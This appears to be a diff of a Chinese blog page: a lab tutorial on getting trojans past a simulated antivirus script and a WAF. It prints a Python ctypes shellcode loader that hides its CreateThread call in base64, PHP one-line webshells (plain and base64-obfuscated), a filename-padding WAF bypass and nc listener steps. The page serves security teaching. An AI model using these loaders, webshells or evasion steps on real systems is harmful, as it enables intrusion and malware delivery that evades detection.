+<h4 id="3-5在操作机再次上传经过upx加壳后的client2-exe文件，靶机脚本未检测出木马，并运行"><a href="#3-5在操作机再次上传经过upx加壳后的client2-exe文件，靶机脚本未检测出木马，并运行" class="headerlink" title="3.5在操作机再次上传经过upx加壳后的client2.exe文件，靶机脚本未检测出木马，并运行"></a>3.5在操作机再次上传经过upx加壳后的client2.exe文件，靶机脚本未检测出木马，并运行</h4><p><img src="img/3.5.PNG"></p>
+<h4 id="3-6centos操作机监听并运行指令"><a href="#3-6centos操作机监听并运行指令" class="headerlink" title="3.6centos操作机监听并运行指令"></a>3.6centos操作机监听并运行指令</h4><p>在centos操作机上运行nc -l -v 9999，建立连接后运行dir，获取目录信息<br><img src="img/3.6.PNG"></p>
+<h3 id="4-花指令绕过实验"><a href="#4-花指令绕过实验" class="headerlink" title="4.花指令绕过实验"></a>4.花指令绕过实验</h3><h4 id="4-1开启模拟病毒检测脚本"><a href="#4-1开启模拟病毒检测脚本" class="headerlink" title="4.1开启模拟病毒检测脚本"></a>4.1开启模拟病毒检测脚本</h4><p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py<br><img src="img/3.1.PNG"></p>
+<h4 id="4-2在操作机上上访问-http-192-168-43-106-8082"><a href="#4-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="4.2在操作机上上访问 http://192.168.43.106:8082/"></a>4.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4><p><img src="img/3.2.PNG"></p>
+<h4 id="4-3在操作机上传client1-exe文件"><a href="#4-3在操作机上传client1-exe文件" class="headerlink" title="4.3在操作机上传client1.exe文件"></a>4.3在操作机上传client1.exe文件</h4><p><img src="img/3.3.PNG"></p>
+<h4 id="4-4靶机脚本检测出木马，删除此文件"><a href="#4-4靶机脚本检测出木马，删除此文件" class="headerlink" title="4.4靶机脚本检测出木马，删除此文件"></a>4.4靶机脚本检测出木马，删除此文件</h4><p><img src="img/3.4.PNG"></p>
+<h4 id="4-5用x64dbj加入垃圾指令"><a href="#4-5用x64dbj加入垃圾指令" class="headerlink" title="4.5用x64dbj加入垃圾指令"></a>4.5用x64dbj加入垃圾指令</h4><p>&emsp;&emsp;例：由下图一加工成图二<br><img src="img/h2.PNG"><img src="img/h1.PNG"></p>
+<h4 id="4-6在操作机再次上传经过x64dbj花指令加工的client11-exe文件，靶机脚本未检测出木马，并运行"><a href="#4-6在操作机再次上传经过x64dbj花指令加工的client11-exe文件，靶机脚本未检测出木马，并运行" class="headerlink" title="4.6在操作机再次上传经过x64dbj花指令加工的client11.exe文件，靶机脚本未检测出木马，并运行"></a>4.6在操作机再次上传经过x64dbj花指令加工的client11.exe文件，靶机脚本未检测出木马，并运行</h4><p><img src="img/3.5.PNG"></p>
+<h4 id="4-7centos操作机监听并运行指令"><a href="#4-7centos操作机监听并运行指令" class="headerlink" title="4.7centos操作机监听并运行指令"></a>4.7centos操作机监听并运行指令</h4><p>在centos操作机上运行nc -l -v 9999，建立连接后运行dir，获取目录信息<br><img src="img/3.6.PNG"></p>
+<h3 id="5-拆分PE绕过实验"><a href="#5-拆分PE绕过实验" class="headerlink" title="5.拆分PE绕过实验"></a>5.拆分PE绕过实验</h3><h4 id="5-1开启模拟病毒检测脚本"><a href="#5-1开启模拟病毒检测脚本" class="headerlink" title="5.1开启模拟病毒检测脚本"></a>5.1开启模拟病毒检测脚本</h4><p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py<br><img src="img/3.1.PNG"></p>
+<h4 id="5-2在操作机上上访问-http-192-168-43-106-8082"><a href="#5-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="5.2在操作机上上访问 http://192.168.43.106:8082/"></a>5.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4><p><img src="img/3.2.PNG"></p>
+<h4 id="5-3在操作机上传client1-exe文件"><a href="#5-3在操作机上传client1-exe文件" class="headerlink" title="5.3在操作机上传client1.exe文件"></a>5.3在操作机上传client1.exe文件</h4><p><img src="img/3.3.PNG"></p>
+<h4 id="5-4靶机脚本检测出木马，删除此文件"><a href="#5-4靶机脚本检测出木马，删除此文件" class="headerlink" title="5.4靶机脚本检测出木马，删除此文件"></a>5.4靶机脚本检测出木马，删除此文件</h4><p><img src="img/3.4.PNG"></p>
+<h4 id="5-5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行"><a href="#5-5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行" class="headerlink" title="5.5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行"></a>5.5在操作机再次上传经过拆分后的client1文件夹中的所有文件，靶机脚本未检测出木马，并运行</h4><p>&emsp;&emsp;用pyinstaller拆分的文件<br><img src="img/6.6.PNG"></p>
+<p>&emsp;&emsp;上传<br><img src="img/3.6.PNG"></p>
+<h4 id="5-6centos操作机监听并运行指令"><a href="#5-6centos操作机监听并运行指令" class="headerlink" title="5.6centos操作机监听并运行指令"></a>5.6centos操作机监听并运行指令</h4><p>在centos操作机上运行nc -l -v 9999，建立连接后运行dir，获取目录信息<br><img src="img/3.5.PNG"></p>
+<h3 id="6-加载器绕过"><a href="#6-加载器绕过" class="headerlink" title="6.加载器绕过"></a>6.加载器绕过</h3><h4 id="6-1编写loader"><a href="#6-1编写loader" class="headerlink" title="6.1编写loader"></a>6.1编写loader</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import ctypes      &#x2F;&#x2F;数据类型转换</span><br><span class="line">import requests    &#x2F;&#x2F; 如果将shellcode放在外网上则使用request访问</span><br><span class="line">import base64     &#x2F;&#x2F;base64实现解码</span><br><span class="line">import binascii  &#x2F;&#x2F;数据类型转换</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">file &#x3D; open(&#39;.&#x2F;test.txt&#39;)</span><br><span class="line">scode &#x3D; file.read()</span><br><span class="line">scode &#x3D; bytes(scode,encoding &#x3D; &#39;utf-8&#39;)</span><br><span class="line">shellcode &#x3D; bytearray(scode)   &#x2F;&#x2F;打开文件读取并转化数据类型</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_uint64 &#x2F;&#x2F;定义数据类型</span><br><span class="line"></span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40)) &#x2F;&#x2F;调用进程的虚地址空间，设定入口地址</span><br><span class="line"></span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode) &#x2F;&#x2F;读取内存</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)&#x2F;&#x2F;复制移动内存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string &#x3D; &#39;&#39;&#39;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKQop&#39;&#39;&#39; &#x2F;&#x2F;是ctypes.windll.kernel32.CreateThread的base64形式，由于会报毒所以编码</span><br><span class="line">handle &#x3D; base64.b64decode(string)</span><br><span class="line">handle &#x3D; int.from_bytes(handle,&#39;big&#39;) </span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(</span><br><span class="line">                                        ctypes.c_int(handle),</span><br><span class="line">                                        ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<h4 id="6-2生成shellcode"><a href="#6-2生成shellcode" class="headerlink" title="6.2生成shellcode"></a>6.2生成shellcode</h4><p><img src="img/6.2.PNG"></p>
+<h4 id="6-3填充shellcode"><a href="#6-3填充shellcode" class="headerlink" title="6.3填充shellcode"></a>6.3填充shellcode</h4><p><img src="img/6.3.PNG"></p>
+<h4 id="6-4运行加载器并查看结果"><a href="#6-4运行加载器并查看结果" class="headerlink" title="6.4运行加载器并查看结果"></a>6.4运行加载器并查看结果</h4><p>python loader.py</p>
+<p><img src="img/6.4.PNG"></p>
+<h3 id="7-二分PE"><a href="#7-二分PE" class="headerlink" title="7.二分PE"></a>7.二分PE</h3><h4 id="7-1利用加载器原理编写peloader"><a href="#7-1利用加载器原理编写peloader" class="headerlink" title="7.1利用加载器原理编写peloader"></a>7.1利用加载器原理编写peloader</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import ctypes      &#x2F;&#x2F;数据类型转换</span><br><span class="line">import requests    &#x2F;&#x2F; 如果将shellcode放在外网上则使用request访问</span><br><span class="line">import base64     &#x2F;&#x2F;base64实现解码</span><br><span class="line">import binascii  &#x2F;&#x2F;数据类型转换</span><br><span class="line"></span><br><span class="line">file &#x3D; open(&#39;.&#x2F;payload.bin&#39;,&#39;rb&#39;)</span><br><span class="line">scode &#x3D; file.read()    &#x2F;&#x2F;打开文件读取</span><br><span class="line">shellcode &#x3D; bytearray(binascii.b2a_hex(scode)) &#x2F;&#x2F;转成byte</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype &#x3D; ctypes.c_uint64  &#x2F;&#x2F;定义数据类型</span><br><span class="line"></span><br><span class="line">ptr &#x3D; ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))  &#x2F;&#x2F;调用进程的虚地址空间，设定入口地址</span><br><span class="line"></span><br><span class="line">buf &#x3D; (ctypes.c_char * len(shellcode)).from_buffer(shellcode) &#x2F;&#x2F;读取内存</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr), </span><br><span class="line">    buf, </span><br><span class="line">    ctypes.c_int(len(shellcode))</span><br><span class="line">)  &#x2F;&#x2F;复制内存</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">string &#x3D; &#39;&#39;&#39;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX3VpbnQ2NChwdHIpLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLnBvaW50ZXIoY3R5cGVzLmNfaW50KDApKQop&#39;&#39;&#39; &#x2F;&#x2F;是ctypes.windll.kernel32.CreateThread的base64形式，由于会报毒所以编码（报毒定位通过分离文件查找）</span><br><span class="line">handle &#x3D; base64.b64decode(string)</span><br><span class="line">handle &#x3D; int.from_bytes(handle,&#39;big&#39;)</span><br><span class="line"></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(</span><br><span class="line">                                        ctypes.c_int(handle),</span><br><span class="line">                                        ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>
+
+<h4 id="7-2生成bin文件"><a href="#7-2生成bin文件" class="headerlink" title="7.2生成bin文件"></a>7.2生成bin文件</h4><p><img src="img/7.2.PNG"></p>
+<h4 id="7-3将payload-bin移到对应路径"><a href="#7-3将payload-bin移到对应路径" class="headerlink" title="7.3将payload.bin移到对应路径"></a>7.3将payload.bin移到对应路径</h4><p><img src="img/7.3.PNG"></p>
+<h4 id="7-4运行加载器并观察结果"><a href="#7-4运行加载器并观察结果" class="headerlink" title="7.4运行加载器并观察结果"></a>7.4运行加载器并观察结果</h4><p>python peloader.py</p>
+<p><img src="img/7.4.PNG"></p>
+<h3 id="8-混淆绕过"><a href="#8-混淆绕过" class="headerlink" title="8.混淆绕过"></a>8.混淆绕过</h3><h4 id="8-1开启模拟病毒检测脚本"><a href="#8-1开启模拟病毒检测脚本" class="headerlink" title="8.1开启模拟病毒检测脚本"></a>8.1开启模拟病毒检测脚本</h4><p>&emsp;&emsp;打开桌面上的“pack-junkinstruction快捷方式”文件夹，双击test.py<br>（具体脚本信息请参考README.md或加壳.md）<br><img src="img/3.1.PNG"></p>
+<h4 id="8-2在操作机上上访问-http-192-168-43-106-8082"><a href="#8-2在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="8.2在操作机上上访问 http://192.168.43.106:8082/"></a>8.2在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4><p><img src="img/3.2.PNG"></p>
+<h4 id="8-3在操作机上传msf4-exe文件"><a href="#8-3在操作机上传msf4-exe文件" class="headerlink" title="8.3在操作机上传msf4.exe文件"></a>8.3在操作机上传msf4.exe文件</h4><p><img src="img/8.4.PNG"></p>
+<h4 id="8-4靶机脚本检测出木马，删除此文件"><a href="#8-4靶机脚本检测出木马，删除此文件" class="headerlink" title="8.4靶机脚本检测出木马，删除此文件"></a>8.4靶机脚本检测出木马，删除此文件</h4><p><img src="img/8.1.PNG"></p>
+<h4 id="8-5在操作机再次上传经过encode混淆后的msf5-exe文件，未检测出木马，开始运行"><a href="#8-5在操作机再次上传经过encode混淆后的msf5-exe文件，未检测出木马，开始运行" class="headerlink" title="8.5在操作机再次上传经过encode混淆后的msf5.exe文件，未检测出木马，开始运行"></a>8.5在操作机再次上传经过encode混淆后的msf5.exe文件，未检测出木马，开始运行</h4><p><img src="img/8.2.PNG"></p>
+<h4 id="8-6centos操作机监听并运行指令"><a href="#8-6centos操作机监听并运行指令" class="headerlink" title="8.6centos操作机监听并运行指令"></a>8.6centos操作机监听并运行指令</h4><p>在kali操作机上用msf监听4444端口，发现建立连接，使用getdesktop指令，发现可以获取靶机信息<br><img src="img/8.3.PNG"></p>
+<h3 id="9-垃圾字符绕过"><a href="#9-垃圾字符绕过" class="headerlink" title="9.垃圾字符绕过"></a>9.垃圾字符绕过</h3><h4 id="9-1在操作机上上访问-http-192-168-43-106-8083"><a href="#9-1在操作机上上访问-http-192-168-43-106-8083" class="headerlink" title="9.1在操作机上上访问 http://192.168.43.106:8083/"></a>9.1在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8083/">http://192.168.43.106:8083/</a></h4><p><img src="img/9.1.PNG"></p>
+<h4 id="9-2编写php木马文件hack-php-内容如下-并上传，被waf拦截"><a href="#9-2编写php木马文件hack-php-内容如下-并上传，被waf拦截" class="headerlink" title="9.2编写php木马文件hack.php,内容如下,并上传，被waf拦截"></a>9.2编写php木马文件hack.php,内容如下,并上传，被waf拦截</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="img/9.2.PNG"></p>
+<h4 id="9-3用burpsuit抓包，并加入垃圾字符"><a href="#9-3用burpsuit抓包，并加入垃圾字符" class="headerlink" title="9.3用burpsuit抓包，并加入垃圾字符"></a>9.3用burpsuit抓包，并加入垃圾字符</h4><p>下图一为原数据包，图二为改后数据包（在文件名前添加966位垃圾字符，使文件名长度为974位）<br><img src="img/9.3.1.PNG"><img src="img/9.3.2.PNG"></p>
+<h4 id="9-4显示上传成功"><a href="#9-4显示上传成功" class="headerlink" title="9.4显示上传成功"></a>9.4显示上传成功</h4><p><img src="img/9.4.PNG"></p>
+<h4 id="9-5用蚁剑连接成功"><a href="#9-5用蚁剑连接成功" class="headerlink" title="9.5用蚁剑连接成功"></a>9.5用蚁剑连接成功</h4><p><img src="img/9.5.PNG"></p>
+<h3 id="10-编码绕过"><a href="#10-编码绕过" class="headerlink" title="10.编码绕过"></a>10.编码绕过</h3><h4 id="10-1在操作机上上访问-http-192-168-43-106-8082"><a href="#10-1在操作机上上访问-http-192-168-43-106-8082" class="headerlink" title="10.1在操作机上上访问 http://192.168.43.106:8082/"></a>10.1在操作机上上访问 <a target="_blank" rel="noopener" href="http://192.168.43.106:8082/">http://192.168.43.106:8082/</a></h4><p><img src="img/3.2.PNG"></p>
+<h4 id="10-2在操作机上传一句话木马hack-php"><a href="#10-2在操作机上传一句话木马hack-php" class="headerlink" title="10.2在操作机上传一句话木马hack.php"></a>10.2在操作机上传一句话木马hack.php</h4><p>&emsp;&emsp;内容为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @system($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="img/10.2.PNG"></p>
+<h4 id="10-3被检测删除"><a href="#10-3被检测删除" class="headerlink" title="10.3被检测删除"></a>10.3被检测删除</h4><p><img src="img/3.4.PNG"></p>
+<h4 id="10-4上传编码后的一句话木马"><a href="#10-4上传编码后的一句话木马" class="headerlink" title="10.4上传编码后的一句话木马"></a>10.4上传编码后的一句话木马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $a&#x3D;base64_decode(&quot;c3lzdGVt&quot;);@$a($_POST[&#39;a&#39;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="10-5用蚁剑连接成功"><a href="#10-5用蚁剑连接成功" class="headerlink" title="10.5用蚁剑连接成功"></a>10.5用蚁剑连接成功</h4><p><img src="img/9.5.PNG"></p>
+<h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h2><p>通过本实验的学习，要求学员学会使用sigthief伪造签名以及了解签名的机制与作用，加载器的编写和使用msf构造shellcode，编写加载器，通过分离文件代码找到特征码并修改，利用donut将exe转换为bin，学习编写简单的木马检测脚本，能总结寻找木马特有的特征的方法，学会简单的加壳技术并通过文件对比来确定其差异，学习二进制知识进行花指令编写</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+      </div>
+    </span>
+  </div>
+</div>
 
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/09/26/%E7%97%85%E6%AF%92%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87/" alt="微信分享二维码">
+    </div>
+</div>
 
-<a href="/2021/04/26/bugku-web-web8/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:51:03.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web8/">bugku_web_web8</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+<nav id="article-nav">
+  
+  
+    <a href="/2021/09/25/uploadlabs-1/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">uploadlabs-1</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
 
 
-<a href="/2021/04/26/bugku-web-web7/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:15:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web7/">bugku_web_web7</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
+        
+        
+    </div>
+</aside>
 
 
-<a href="/2021/04/26/bugku-web-web6/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:00:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web6/">bugku_web_web6</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web5/" class="archive-article-date">
-  	<time datetime="2021-04-26T11:30:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web5/">bugku_web_web5</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web4/" class="archive-article-date">
-  	<time datetime="2021-04-26T11:19:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web4/">bugku_web_web4</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web3/" class="archive-article-date">
-  	<time datetime="2021-04-26T11:05:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web3/">bugku_web_web3</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web2/" class="archive-article-date">
-  	<time datetime="2021-04-26T10:52:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web2/">bugku_web_web2</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/04/26/bugku-web-web1/" class="archive-article-date">
-  	<time datetime="2021-04-26T10:02:23.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/bugku-web-web1/">bugku_web_web1</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/03/22/%E6%B6%85%E6%99%AE%E5%86%AC%E4%BB%A4%E8%90%A5web%E7%AF%87little-trick/" class="archive-article-date">
-  	<time datetime="2021-03-22T11:09:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/22/%E6%B6%85%E6%99%AE%E5%86%AC%E4%BB%A4%E8%90%A5web%E7%AF%87little-trick/">涅普冬令营web篇little_trick</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	
-
-
-<a href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-js/" class="archive-article-date">
-  	<time datetime="2021-03-14T14:13:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-03-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/03/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BAsimple-js/">攻防世界web新手区simple_js</a>
-    </h1>
